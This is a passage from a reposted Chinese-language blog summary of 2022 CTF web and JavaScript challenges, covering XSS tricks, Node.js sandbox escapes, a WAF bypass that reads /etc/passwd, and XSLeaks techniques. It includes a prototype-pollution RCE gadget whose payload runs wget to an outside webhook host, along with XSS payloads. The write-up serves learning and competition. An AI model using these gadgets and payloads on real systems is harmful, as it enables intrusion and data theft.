---
title: 2022 年 CTF Web 前端與 JS 題總結
url: https://buaq.net/go-141469.html
source: unSafe.sh - 不安全
date: 2022-12-27
fetch_date: 2025-10-04T02:32:04.591037
---

# 2022 年 CTF Web 前端與 JS 題總結

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

2022 年 CTF Web 前端與 JS 題總結

今年認真跟著 Water Paddler 打了一整年的 CTF，看到有人整理出了一篇 CTF: Best Web Challenges 2022，發現裡面的題目大多數我都有
*2022-12-26 20:10:44
Author: [blog.huli.tw(查看原文)](/jump-141469.htm)
阅读量:114
收藏*

---

今年認真跟著 Water Paddler 打了一整年的 CTF，看到有人整理出了一篇 [CTF: Best Web Challenges 2022](https://blog.arkark.dev/2022/12/17/best-web-challs/)，發現裡面的題目大多數我都有打過，就想說那不如我來寫一篇整理吧，整理一下我自己打過覺得有學到新東西的題目。

因為個人興趣，所以會特別記下來的題目都跟前端與 JS 相關，像是其他有關於後端（PHP、Java 等等）的我就沒記了。

另外，這題有紀錄到的技巧或解法不代表第一次出現在 CTF 上，只是我第一次看到或是覺得值得紀錄，就會寫下來。

我把題目分成幾個類別：

1. JS 相關知識
2. Node.js 相關
3. XSLeaks
4. 前端 DOM/BOM 相關知識
5. 瀏覽器內部運作相關

## JS 相關知識

### DiceCTF 2022 - no-cookies

這題的重點在於有一段程式碼的概念大概是這樣：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` {   const pwd = prompt('input password')   if (!/^[^$']+$/.test(pwd)) return   document.querySelector('.note').innerHTML = xssPayload } ``` |

最後一行你有一個 DOM-based XSS，但你要偷的 pwd 是在 block 裡面，怎麼想都不可能存取到這一段。

而關鍵是那個看似不起眼的 RegExp，有個神奇的屬性叫做 `RegExp.input` 會把上次 test 的東西記起來，因此拿這個就可以拿到 pwd。

詳細 writeup：<https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webno-cookies5-solves>

### PlaidCTF 2022 - YACA

題目核心概念類似這樣（不過我記得是非預期解就是了）：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` var tmpl = '<input type="submit" value="{{value}}">' var value = prompt('your payload') value = value.replace(/[>"]/g, '') tmpl = tmpl.replace('{{value}}', value) document.body.innerHTML = tmpl ``` |

`>"` 都被取代掉了，看似不可能跳脫出屬性，但重點是 tmpl replace 的參數是可以控制的，此時可以利用 [special replacement pattern](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) 來找回你的 tag：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` var tmpl = '<input type="submit" value="{{value}}">' var value = "$'<style onload=alert(1) " value = value.replace(/[>"]/g, '') tmpl = tmpl.replace('{{value}}', value) console.log(tmpl) ``` |

完整 writeup：<https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/>

### ångstromCTF 2022 - CaaSio PSE

簡單來說就是用 `with()` 來繞過不能用 `.` 的限制

完整 writeup：<https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#misccaasio-pse>

### GoogleCTF 2022 - HORKOS

這題我會稱之為「JS 反序列化」，簡單來說就是 JS 裡面也有一些 magic method，會偷偷被執行到。

例如說你在 async function return 一個東西時，如果這個東西是 Promise，就會先解析完才回傳，所以 `then` 就會偷偷被呼叫到。

同理，一些隱式的型別轉換也會呼叫到 `toString` 或是 `valueOf`，轉成 JSON 時也會呼叫 `toJSON` 之類的。

完整 writeup：<https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves>

### corCTF 2022 - sbxcalc

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` var p = new Proxy({flag: window.flag || 'flag'}, {   get: () => 'nope' }) ``` |

要如何拿到被 Proxy 保護住的原始物件？

答案是 `Object.getOwnPropertyDescriptor(p, 'flag')`

writeup：
<https://blog.huli.tw/2022/12/08/ctf-js-notes/#corctf-2022-sbxcalc>

## Node.js 相關

### DiceCTF 2022 - undefined

這題核心大概是這樣：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` Function.prototype.constructor = undefined; delete global.global; process = undefined; {   let Array=undefined;let __dirname=undefined;let Int8Array=undefined;         console.log(eval(input)); } ``` |

基本上就是先把所有東西變成 `undefined`，最後會用 `eval` 執行你傳進去的程式碼。雖然你可以跑任何東西，但因為所有東西都變成 `undefined` 了，你沒什麼能做的。

解法有三個：

1. `import()`，這個沒被刪掉
2. 用 `arguments.callee.caller.arguments` 可以拿到上層被覆蓋掉的 arguments（Node.js 自動幫你包的一層）
3. 用 try catch 可以拿到 Error 的 instance

詳細 writeup: <https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#miscundefined55-solves>

### corCTF 2022 - simplewaf

這題的核心是這樣：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` if([req.body, req.headers, req.query].some(     (item) => item && JSON.stringify(item).includes("flag") )) {     return res.send("bad hacker!"); } res.send(fs.readFileSync(req.query.file || "index.html").toString()); ``` |

你可以控制 `req.query.file` 但是不能包含 `flag` 這個字，目標是讀到 `/app/flag.txt` 這個檔案。

這題需要去看 `fs.readFileSync` 的內部實作，會發現可以傳入一個長得很像 URL instance 的物件，就會用 new URL() 去讀，就可以用 URL encode 繞過了：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` const fs = require('fs')  console.log(fs.readFileSync({   href: 1,   origin: 1,   protocol: 'file:',   hostname: '',   pathname: '/etc/passw%64' }).toString()) ``` |

作者 writeup：<https://brycec.me/posts/corctf_2022_challenges#simplewaf>

### Balsn CTF 2022 - 2linenodejs

程式碼核心長這樣：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ``` | ``` #!/usr/local/bin/node process.stdin.setEncoding('utf-8'); process.stdin.on('readable', () => {   try{     console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');     const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],     obj = JSON.parse(json);     console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));   }catch (e) {     require('./usage')   }finally{     process.exit();   } });   module.exports=(O,o) => (     Object.entries(O).forEach(         ([K,V])=>Object.entries(V).forEach(             ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)         )     ), o ); ``` |

有一個很明顯的 prototype pollution，要做到 RCE。

這邊有一篇很棒的論文可以參考：[Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://arxiv.org/abs/2207.11171)

但論文裡面提到的 gadget 被修掉了，要自己再找一個，結果如下：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` Object.prototype["data"] = {   exports: {     ".": "./preinstall.js"   },   name: './usage' } Object.prototype["path"] = '/opt/yarn-v1.22.19' Object.prototype.shell = "node" Object.prototype["npm_config_global"] = 1 Object.prototype.env = {   "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",   "NODE_OPTIONS": "--require=/proc/self/environ" }  require('./usage.js') ``` |

細節可以看完整 writeup：<https://blog.huli.tw/2022/12/08/ctf-js-notes#balsn-ctf-2022-2linenodejs>

## XSleaks

### DiceCTF 2022 - carrot

這題簡單來說就是利用 [connection pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/) 來測量 response time。

你可能會想說測量 response time 有什麼難的，fetch 外加自己算一下不就好了嗎？但如果有 SameSite cookie 的話，fetch 是無法使用的，這時候就需要用到一些 XSleaks 的小技巧來測量時間。

在 Chrome 裡面 socket 數量是有上限的，一般是 255，headless 是 99，假設我們先把 socket 消耗到只剩下一個，這時候我去造訪我想測量時間的 URL（叫做 reqSearch），與此同時發另一個 request 到我們自己的 server（叫做 reqMeasure）。

由於 socket 只剩一個，所以 reqMeasure 從發出 request 到收到 response 的時間，就是 `reqSearch 花的時間 + reqMeasure 花的時間`，假設 reqMeasure 花的時間都差不多，那我們很容易可以測量出 reqSearch 花的時間。

詳細 writeup：<https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webcarrot1-solves>

### TSJ CTF 2022 - Nim Notes

這題你可以做到 CRLF injection，但是位置在最底下，所以沒辦法覆蓋 CSP 也無法 XSS，要怎麼偷到頁面的內容？

假設要偷的內容在 `<script>` 裡面，可以利用 [Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) 這個 header，因為違反規時會發送一段 JSON 到指定位置，其中會包含 scripe 的前 40 個字元。

完整 writeup：<https://blog.huli.tw/2022/03/02/tsj-ctf-2022-nim-notes/>

### ångstromCTF 2022 - Sustenance

有一個搜尋功能，成功跟失敗的差別在於網址不同。

例如說成功是：`/?m=your search...at 1651732982748 has success....`，失敗是：`/?m=your search...at 1651732982748 has failed`

解法兩個，一個是利用 response 會 cache 的這點用 fetch 去測量是否有在 cache 內。雖然說 Chrome 有實裝 Cache parition 了，但是 headless 還沒。

第二個是利用其他 same site domain 做 cookie tossing，就可以構造出一個 cookie bomb，當搜尋成功的時候 payload 會太大（因為網址多了幾個字元），失敗的時候就沒事，藉此測量出差異。

完整 writeup：<https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#websustenance>

### justCTF 2022 - Ninja

新的 xsleak，利用 `:target` 搭配 `:before` 來載入圖片。

細節可參考：[New technique of stealing data using CSS and Scroll-to-Text Fragment feature.](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

完整 writeup：<https://blog.huli.tw/2022/06/14/justctf-2022-writeup#ninja1-solves>

### SekaiCTF 2022 - safelist...